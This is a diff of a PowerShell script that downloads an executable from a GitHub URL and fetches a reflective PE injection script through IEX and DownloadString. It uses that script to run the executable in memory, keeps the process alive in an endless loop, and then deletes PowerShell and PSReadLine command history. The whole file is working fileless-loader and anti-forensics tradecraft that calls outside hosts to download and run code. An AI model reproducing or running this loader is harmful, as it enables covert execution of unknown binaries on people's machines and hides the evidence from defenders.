@@ -1,5 +1,5 @@
 # ===============================================
-# Run GUI EXE from URL in Memory + Keep Window Open + Clear History
+# Run GUI EXE from URL + Force Keep Window Open + Clear History
 # ===============================================
 
 $Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
@@ -13,7 +13,7 @@ try {
     $PEBytes = $WebClient.DownloadData($Url)
     Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Download failed!" -ForegroundColor Red
     exit
 }
 
@@ -22,13 +22,7 @@ try {
 
 # Load Reflective PE Loader
 Write-Host "[+] Loading Reflective PE Injection..." -ForegroundColor Yellow
-
-try {
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
-} catch {
-    Write-Host "[-] Failed to load Reflective Loader." -ForegroundColor Red
-    exit
-}
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
 
 Write-Host "[+] Injecting GUI EXE in memory..." -ForegroundColor Green
 
@@ -39,27 +33,23 @@ try {
         Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
     }
     
-    Write-Host "[+] GUI Program launched successfully!" -ForegroundColor Green
-    Write-Host "`nThe program window should now appear." -ForegroundColor Yellow
-    Write-Host "This PowerShell window will stay open until you close the GUI program." -ForegroundColor Cyan
+    Write-Host "[+] GUI Program Launched Successfully!" -ForegroundColor Green
+    Write-Host "`nThe program should be running now." -ForegroundColor Yellow
+    Write-Host "Do NOT close this window manually." -ForegroundColor Cyan
+
+    # === Force Keep PowerShell Alive ===
+    Write-Host "`nKeeping this window open (Press Ctrl+C to force close)..." -ForegroundColor Magenta
     
-    # Keep PowerShell alive for GUI application
-    Write-Host "`nWaiting for program to run... (Press Ctrl+C to stop)" -ForegroundColor DarkGray
-    Start-Sleep -Seconds 3600   # Wait 1 hour (you can change this)
+    while ($true) {
+        Start-Sleep -Seconds 10
+    }
 
 } catch {
     Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
     Start-Sleep -Seconds 10
 }
 
-# ================== Clear PowerShell History ==================
-Write-Host "[+] Clearing PowerShell history..." -ForegroundColor DarkGray
-
+# Clear History (if it reaches here)
 Clear-History -ErrorAction SilentlyContinue
-if (Get-PSReadlineOption) {
-    Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
-}
+if (Get-PSReadlineOption) { Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue }
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-
-# Close PowerShell
-Stop-Process -Id $PID -Force
